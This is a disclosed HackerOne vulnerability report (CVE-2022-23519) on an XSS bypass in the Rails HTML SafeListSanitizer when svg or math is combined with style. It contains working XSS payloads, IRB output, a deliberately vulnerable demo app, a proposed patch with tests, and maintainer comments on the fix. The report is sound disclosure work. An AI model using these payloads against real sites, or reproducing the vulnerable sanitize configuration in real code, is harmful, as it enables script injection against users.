{
    "id": 1656627,
    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjU2NjI3",
    "url": "https://hackerone.com/reports/1656627",
    "title": "Rails::Html::SafeListSanitizer vulnerable to XSS when certain tags are allowed (math+style || svg+style)",
    "state": "Closed",
    "substate": "resolved",
    "severity_rating": "medium",
    "readable_substate": "Resolved",
    "created_at": "2022-08-01T21:28:55.088Z",
    "submitted_at": "2022-08-01T21:28:55.174Z",
    "is_member_of_team?": false,
    "is_organization_group_member?": false,
    "reporter": {
        "disabled": false,
        "username": "0b5cur17y",
        "url": "/0b5cur17y",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/oQRYWBvwMZSWFYZtEEzqK5AN/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
        },
        "is_me?": false,
        "cleared": false,
        "verified": false,
        "hackerone_triager": false,
        "hacker_mediation": false
    },
    "team": {
        "id": 22,
        "url": "https://hackerone.com/rails",
        "handle": "rails",
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "permissions": [],
        "submission_state": "open",
        "default_currency": "usd",
        "awards_miles": false,
        "offers_bounties": true,
        "state": "public_mode",
        "only_cleared_hackers": false,
        "pentest_feature_enabled?": false,
        "profile": {
            "name": "Ruby on Rails",
            "twitter_handle": "rails",
            "website": "http://rubyonrails.org/security",
            "about": "Web development that doesn't hurt."
        }
    },
    "has_bounty?": false,
    "in_validation?": false,
    "can_view_team": true,
    "can_view_report": true,
    "is_external_bug": false,
    "is_published": false,
    "is_participant": false,
    "has_collaborators": false,
    "submitted_by_team_member": false,
    "stage": 4,
    "public": true,
    "visibility": "full",
    "cve_ids": [
        "CVE-2022-23519"
    ],
    "singular_disclosure_disabled": false,
    "disclosed_at": "2022-12-14T22:41:10.444Z",
    "bug_reporter_agreed_on_going_public_at": "2022-12-14T21:02:54.631Z",
    "team_member_agreed_on_going_public_at": "2022-12-14T22:41:10.298Z",
    "comments_closed?": false,
    "facebook_team?": false,
    "team_private?": false,
    "vulnerability_information": "## Intro\n\nThe Rails HTML sanitzier allows to set certain combinations of tags in it's allow list that are not properly handled. \nSimilar to the report [1530898](https://hackerone.com/reports/1530898), which identified the combination`select` and `style` as vulnerable,\nmy fuzz testing from today suggests that also `svg` and `style` as well as `math` and `style` allow XSS.\nThe following are PoCs for each of these allow list:\n- `svg` and `style`: `<svg><style><script>alert(1)</script></style></svg>`\n- `math` and `style`: `<math><style><img src=x onerror=alert(1)></style></math>`\n\nSee the following IRB session: \n```\nirb(main):016:0> require 'rails-html-sanitizer'\n=> false\nirb(main):017:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<svg><style><script>alert(1)</script></style></svg>\", tags: [\"svg\", \"style\"]).to_s\n=> \"<svg><style><script>alert(1)</script></style></svg>\"\nirb(main):018:0> Rails::Html::SafeListSanitizer.new.sanitize(\"<math><style><img src=x onerror=alert(1)></style></math>\", tags: [\"math\", \"style\"]).to_s\n=> \"<math><style><img src=x onerror=alert(1)></style></math>\"\nirb(main):019:0> puts Rails::Html::Sanitizer::VERSION\n1.4.3\n=> nil \n```\n\n## Sample Vulnerable Rails Application\n\nTo build a sample rails application that is vulnerable, I've used the following `Dockerfile`:\n\n```\nFROM ruby:3.1.2\n\nRUN apt-get update && apt-get install -y vim\n\nWORKDIR /usr/src/app\nRUN gem install rails && rails new myapp\nWORKDIR /usr/src/app/myapp\n\n\nCOPY build-rails-app.sh ./build-rails-app.sh\nRUN sh ./build-rails-app.sh\nRUN RAILS_ENV=production rails assets:precompile\n\nCMD [\"./bin/rails\", \"server\", \"-b\", \"0.0.0.0\", \"-e\", \"production\"]\n```\n\nIn the same directory, put a shell script `build-rails-app.sh` which writes the app:\n\n```\n#!/ibn/sh\n\n# make routes\ncat << EOF > ./config/routes.rb\nRails.application.routes.draw do\n  get \"/poc1\", to: \"poc1#index\"\n  get \"/poc2\", to: \"poc2#index\"\nend\nEOF\n\n# make Poc1 endpoint\n# http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E\nbin/rails generate controller Poc1 index --skip-routes\n\ncat << EOF > ./app/controllers/poc1_controller.rb\nclass Poc1Controller < ApplicationController\n  def index\n    @name = params[:name] || \"put your name here\"\n  end\nend\nEOF\n\n\ncat << EOF > ./app/views/poc1/index.html.erb\n<h1> Hello <%= sanitize @name, tags: [\"svg\", \"style\"] %> </h1>\n<br>\nPoC with a sanitized, reflected parameter 'name' for which 'svg' annd 'style' tags are allowed.\n<br>\n<%= link_to \"Go to PoC\", \"/poc1?name=<svg><style><script>alert(1)</script></style><svg>\" %>\n<br>\n<br>\nUsing: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>\nEOF\n\n\n# make Poc2 endpoint\n# http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E\nbin/rails generate controller Poc2 index --skip-routes\n\ncat << EOF > ./app/controllers/poc2_controller.rb\nclass Poc2Controller < ApplicationController\n  def index\n    @name = params[:name] || \"put your name here\"\n  end\nend\nEOF\n\n\ncat << EOF > ./app/views/poc2/index.html.erb\n<h1> Hello <%= sanitize @name, tags: [\"math\", \"style\"] %> </h1>\n<br>\nPoC with a sanitized, reflected parameter 'name' for which 'math' annd 'style' tags are allowed.\n<br>\n<%= link_to \"Go to PoC\", \"/poc2?name=<math><style><img src=x onerror=alert(1)></style><math>\" %>\n<br>\n<br>\nUsing: rails-html-sanitizer <%= Rails::Html::Sanitizer::VERSION %>\nEOF\n```\n\nWith the following `Makefile` you can build and run the application\n\n```\n.PHONY: build\nbuild:\n\tdocker build -t local/railspoc:latest .\n\n.PHONY: run\nrun:\n\tdocker run -it --rm -p 127.0.0.1:8888:3000 local/railspoc:latest\n```\n\nNow you have a Rails application with two routes `/poc1` and `/poc2` running locally. Visit:\n- [http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E](http://localhost:8888/poc1?name=%3Csvg%3E%3Cstyle%3E%3Cscript%3Ealert(1)%3C/script%3E%3C/style%3E%3Csvg%3E)\n- [http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E](http://localhost:8888/poc2?name=%3Cmath%3E%3Cstyle%3E%3Cimg%20src=x%20onerror=alert(1)%3E%3C/style%3E%3Cmath%3E)\n\nSee the secreenshot attached for what it will roughly look like. Both alerts should be executed.\n\n## Suggestion for Fix\n\nAlong the lines of the fix for [1530898](https://hackerone.com/reports/1530898), the following patch could prevent both vectors.\nI've just added the two new bad combinations to the check in `remove_safelist_tag_combinations` and adjusted the test to cover all of them too.\nIn all cases, the `style` tag gets removed from the whitelist, which breaks to PoC:\n\n```\nFrom f78df36644520c57770132a607cedafeec19d796 Mon Sep 17 00:00:00 2001\nFrom: Dominic Breuker <dominic.breuker@protonmail.com>\nDate: Mon, 1 Aug 2022 22:57:10 +0200\nSubject: [PATCH] disallow safelist combinations of svg+style or math+style\n\n---\n lib/rails/html/sanitizer.rb | 12 ++++++++++--\n test/sanitizer_test.rb      | 35 ++++++++++++++++++++---------------\n 2 files changed, 30 insertions(+), 17 deletions(-)\n\ndiff --git a/lib/rails/html/sanitizer.rb b/lib/rails/html/sanitizer.rb\nindex 97503c8..10cd7c4 100644\n--- a/lib/rails/html/sanitizer.rb\n+++ b/lib/rails/html/sanitizer.rb\n@@ -147,13 +147,21 @@ module Rails\n       end\n \n       def remove_safelist_tag_combinations(tags)\n-        if !loofah_using_html5? && tags.include?(\"select\") && tags.include?(\"style\")\n-          warn(\"WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select'\")\n+        if !loofah_using_html5? && dangerous_safelist?(tags)\n+          warn(\"WARNING: #{self.class}: removing 'style' from safelist, should not be combined with 'select', 'svg' or 'math'\")\n           tags.delete(\"style\")\n         end\n         tags\n       end\n \n+      def dangerous_safelist?(tags)\n+        if tags.include?(\"style\")\n+          tags.include?(\"select\") || tags.include?(\"svg\") || tags.include?(\"math\")\n+        else\n+          false\n+        end\n+      end\n+\n       def allowed_tags(options)\n         if options[:tags]\n           remove_safelist_tag_combinations(options[:tags])\ndiff --git a/test/sanitizer_test.rb b/test/sanitizer_test.rb\nindex e3ce218..c52eef9 100644\n--- a/test/sanitizer_test.rb\n+++ b/test/sanitizer_test.rb\n@@ -588,22 +588,27 @@ class SanitizersTest < Minitest::Test\n   end\n \n   def test_disallow_the_dangerous_safelist_combination_of_select_and_style\n-    input = \"<select><style><script>alert(1)</script></style></select>\"\n-    tags = [\"select\", \"style\"]\n-    warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/\n-    sanitized = nil\n-    invocation = Proc.new { sanitized = safe_list_sanitize(input, tags: tags) }\n-\n-    if html5_mode?\n-      # if Loofah is using an HTML5 parser,\n-      #   then \"style\" should be removed by the parser as an invalid child of \"select\"\n-      assert_silent(&invocation)\n-    else\n-      # if Loofah is using an HTML4 parser,\n-      #   then SafeListSanitizer should remove \"style\" from the safelist\n-      assert_output(nil, warning, &invocation)\n+    tests = {\n+      \"<select><style><script>alert(1)</script></style></select>\" => [\"select\", \"style\"],\n+      \"<svg><style><script>alert(1)</script></style></svg>\" => [\"svg\", \"style\"],\n+      \"<math><style><img src=x onerror=alert(1)></style></math>\" => [\"math\", \"style\"],\n+    }\n+    tests.each do |input, tags| \n+      warning = /WARNING: Rails::Html::SafeListSanitizer: removing 'style' from safelist/\n+      sanitized = nil\n+      invocation = Proc.new { sanitized = safe_list_sanitize(input, tags: tags) }\n+\n+      if html5_mode?\n+        # if Loofah is using an HTML5 parser,\n+        #   then \"style\" should be removed by the parser as an invalid child of \"select\"\n+        assert_silent(&invocation)\n+      else\n+        # if Loofah is using an HTML4 parser,\n+        #   then SafeListSanitizer should remove \"style\" from the safelist\n+        assert_output(nil, warning, &invocation)\n+      end\n+      refute_includes(sanitized, \"style\")\n     end\n-    refute_includes(sanitized, \"style\")\n   end\n \n protected\n-- \n2.35.1\n\n```\n\n## Impact\n\nIt is possible to bypass Rails::Html::SafeListSanitizer filtering and perform an XSS attack.",
    "weakness": {
        "id": 60,
        "name": "Cross-site Scripting (XSS) - Generic"
    },
    "original_report_id": null,
    "original_report_url": null,
    "attachments": [
        {
            "id": 1848827,
            "file_name": "rails-sanitizer-xss-pocs-1-2.png",
            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/4zstaub7hipkpb6n2v0dfey3jnc2?response-content-disposition=attachment%3B%20filename%3D%22rails-sanitizer-xss-pocs-1-2.png%22%3B%20filename%2A%3DUTF-8%27%27rails-sanitizer-xss-pocs-1-2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6BUFUEE%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T065811Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDD9FHXU0ld2gtz64ZpnjlAw950FEQMqICGzFbRk4pC0AIhAMguqPvT6svEZTrq0b2WG76XHZFVJtNfIkDZQTZEBAWsKrsFCKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgygpHklaEgyfIVznI8qjwWOIdWktDm9Jabt75qlpVIMtXS%2FssDvdH3liIUrqSO%2Fn2cugELxTHsITAFkdxtpuIqUfC022kq1x7KnVsJ8dbHLeYcjqR%2BmyMsSM7Xr6UnozwhB4Y9cX%2F6UxIQ4Shov2Zz%2B4D9ygjyO8TAHyL4iD%2B6CaUtaTRDQPU4E5CflxhSrTzcxVSW%2BqeTqxyYZggcMEnSIhCb9IgOZ920mfAKlQNAc9hEp1VBpmPzgJ45%2F2pnRD4bAeZccOTQ2N7ai9tDdrydJZNrpSPB7gPdG8BDlQdEVpOmjIqxieGAy0zoKfSOl%2F5VHAxD0l8CodVdcp4kMEcdDDDNKGFD%2BYvWC25TJ5mw59Uk5USrQymohsM1fenBd610Hv6tbF2BGQAVrViDT2nJXnDxNQyRmqsIbJeitdGdnlpUpx45ObdZIcNmzHof%2FPv%2FVqoTgI06D0Wk6Z63VBvlhxWqLe%2BSaLcx2GAU%2Fy14hWDJEf7ZqhZ%2BM9OJtRIxfWXKISDxoTmTfZp%2F5B%2FiqubY1RL%2FDk%2BkMTxMcbSGw43o6kyeDbQbyyaDtV%2BYAWvx%2BSe9%2FhRFQPmqTdKCb%2BT23vEPLhAJ2vYsQ%2BTTeLcxLwsZ3TUOVQTBnE3%2FUfsxEMeVHPai2qUl0CGsun0HgjD95lQIzmeHal%2B%2BEP6LBM8JhmIfrmEmxecDlEpJEWMvTnef%2FUlhfSrGHNndRTanOi%2BSbxAkMtWE84y5d6km2hMzs9vO8ITHcwoDqJD9MHDjIWYVJG9MlQbnFckuSFWS1rIVtaRMcayfrXSfW9hMolo%2BRqzfol8wiNwiDk%2FCKe151LpjhbW4NYcVDBPgw8tG9ATi5pkPIxbtfE3grt%2BpRK%2Faq2%2F5BArkGIJcrN5tzOoFCLeiuMLOltqcGOrABo0TqeJmB%2BrDGBqaoTHwPAvK4%2FwgcpFFUm8NwdvRQDqlRqJax0yb%2BBe6w2ez9ShfsMMqJTOyg4Y%2FE%2BuAcIW10gTr%2BvpIXBkF%2F8x6GDpOA2qbdCvafgrSufD%2B5I4%2BvTz5e4TgiIX3QWw7OH4QNLX1OUdaUk3t0Pz5pXzlKIOWV579ZeH8AP1NSW2e%2Fj%2B8nGME4HiDOlB%2BZW%2FO8raM%2BngBp42hfPK0q4CctRMJh8z2fdSQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=3ebf7dd82eb84fcdf1e041f5732c59c492067aaaec98b83e1fb251ba6af42c9b",
            "file_size": 151269,
            "type": "image/png"
        }
    ],
    "allow_singular_disclosure_at": "2023-01-13T21:02:54.724Z",
    "allow_singular_disclosure_after": -19648517.08728357,
    "singular_disclosure_allowed": true,
    "vote_count": 7,
    "voters": [
        "jumpydata",
        "quickjohn",
        "zy9ard3",
        "shubham_srt",
        "shivammusic",
        "meispi",
        "ariwabtc234"
    ],
    "severity": {
        "rating": "medium",
        "score": 4.7,
        "author_type": "User",
        "metrics": {
            "attack_vector": "network",
            "attack_complexity": "high",
            "privileges_required": "none",
            "user_interaction": "required",
            "scope": "changed",
            "confidentiality": "low",
            "integrity": "low",
            "availability": "none"
        }
    },
    "structured_scope": {
        "databaseId": 160,
        "asset_type": "SOURCE_CODE",
        "asset_identifier": "https://github.com/rails/rails",
        "max_severity": "critical"
    },
    "abilities": {
        "assignable_team_members": [],
        "assignable_team_member_groups": []
    },
    "activities": [
        {
            "id": 17888023,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Thanks for submitting this report! I'm going to take some time to reproduce what you're seeing and understand what's going on so I can reply thoughtfully.",
            "automated_response": false,
            "created_at": "2022-08-08T01:47:17.135Z",
            "updated_at": "2022-08-08T01:47:17.135Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 18140035,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugTriaged",
            "message": "Thanks so much again for this report, this is definitely an interesting vulnerability. I spent quite a bit of time this week analyzing what's going on and I have proposed two potential solutions to the Rails security team.\n",
            "automated_response": false,
            "created_at": "2022-08-26T19:37:10.657Z",
            "updated_at": "2022-08-26T19:37:10.657Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 18304187,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ExternalUserJoined",
            "message": "",
            "automated_response": false,
            "created_at": "2022-09-08T16:26:24.875Z",
            "updated_at": "2022-09-08T16:26:24.875Z",
            "additional_data": {
                "report_permissions": null,
                "duplicate_report_id": 1695379
            },
            "actor": {
                "username": "haqpl",
                "cleared": false,
                "verified": false,
                "url": "/haqpl",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/nqha2oi4mj36dljeq1anfuiul7lj/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19193628,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "did the Rails people like one of them? :)",
            "automated_response": false,
            "created_at": "2022-11-12T19:04:16.090Z",
            "updated_at": "2022-11-12T19:04:16.090Z",
            "actor": {
                "username": "0b5cur17y",
                "cleared": false,
                "verified": false,
                "url": "/0b5cur17y",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oQRYWBvwMZSWFYZtEEzqK5AN/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19198296,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Thanks for your patience. I have a fix for this, but waiting to release and disclose because I'd like to batch some other security updates with it.",
            "automated_response": false,
            "created_at": "2022-11-13T14:47:24.260Z",
            "updated_at": "2022-11-13T14:47:24.260Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19549396,
            "is_internal": false,
            "editable": false,
            "type": "Activities::CveIdAdded",
            "message": "",
            "automated_response": false,
            "created_at": "2022-12-13T14:01:48.815Z",
            "updated_at": "2022-12-13T14:01:48.815Z",
            "cve_ids": [
                "CVE-2022-23519"
            ],
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19549400,
            "is_internal": false,
            "editable": false,
            "type": "Activities::BugResolved",
            "message": "rails-html-sanitizer v1.4.4 addresses this. see https://github.com/rails/rails-html-sanitizer/security/advisories/GHSA-9h9g-93gc-623h",
            "automated_response": false,
            "created_at": "2022-12-13T14:02:10.709Z",
            "updated_at": "2022-12-13T14:02:10.709Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "reporter": {
                "username": "0b5cur17y",
                "url": "/0b5cur17y"
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19576668,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "so glad I can finally read your discussion of the two potential solutions :)",
            "automated_response": false,
            "created_at": "2022-12-14T21:02:54.661Z",
            "updated_at": "2022-12-14T21:02:54.661Z",
            "first_to_agree": true,
            "actor": {
                "username": "0b5cur17y",
                "cleared": false,
                "verified": false,
                "url": "/0b5cur17y",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oQRYWBvwMZSWFYZtEEzqK5AN/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19577240,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "Please see https://github.com/flavorjones/loofah/blob/main/docs/2022-10-decision-on-cdata-nodes.md for an explanation on the approach taken.",
            "automated_response": false,
            "created_at": "2022-12-14T22:37:25.972Z",
            "updated_at": "2022-12-14T22:37:25.972Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19577249,
            "is_internal": false,
            "editable": false,
            "type": "Activities::AgreedOnGoingPublic",
            "message": "",
            "automated_response": false,
            "created_at": "2022-12-14T22:41:10.343Z",
            "updated_at": "2022-12-14T22:41:10.343Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19577250,
            "is_internal": false,
            "editable": false,
            "type": "Activities::ReportBecamePublic",
            "message": "",
            "automated_response": false,
            "created_at": "2022-12-14T22:41:10.521Z",
            "updated_at": "2022-12-14T22:41:10.521Z",
            "actor": {
                "username": "flavorjones",
                "cleared": false,
                "verified": false,
                "url": "/flavorjones",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/021/838/46ee032291a72117d0024e2c8db75deb2c51f76f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        },
        {
            "id": 19657833,
            "is_internal": false,
            "editable": false,
            "type": "Activities::Comment",
            "message": "For the next person who wants to give it a try: code for fuzzing [is here](https://dominicbreuker.com/post/a_tale_of_two_xss_in_rails_html_sanitizer/#cve-2022-23519-more-xss-for-mathstyle-and-svgstyle)",
            "automated_response": false,
            "created_at": "2022-12-20T21:48:56.467Z",
            "updated_at": "2022-12-20T21:48:56.467Z",
            "actor": {
                "username": "0b5cur17y",
                "cleared": false,
                "verified": false,
                "url": "/0b5cur17y",
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/variants/oQRYWBvwMZSWFYZtEEzqK5AN/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
                },
                "hackerone_triager": false,
                "hackerone_employee": false
            },
            "genius_execution_id": null,
            "team_handle": "rails"
        }
    ],
    "activity_page_count": 1,
    "activity_page_number": 1,
    "summaries": [
        {
            "category": "team",
            "can_view?": true,
            "can_create?": false
        },
        {
            "category": "researcher",
            "can_view?": true,
            "can_create?": false
        }
    ]
}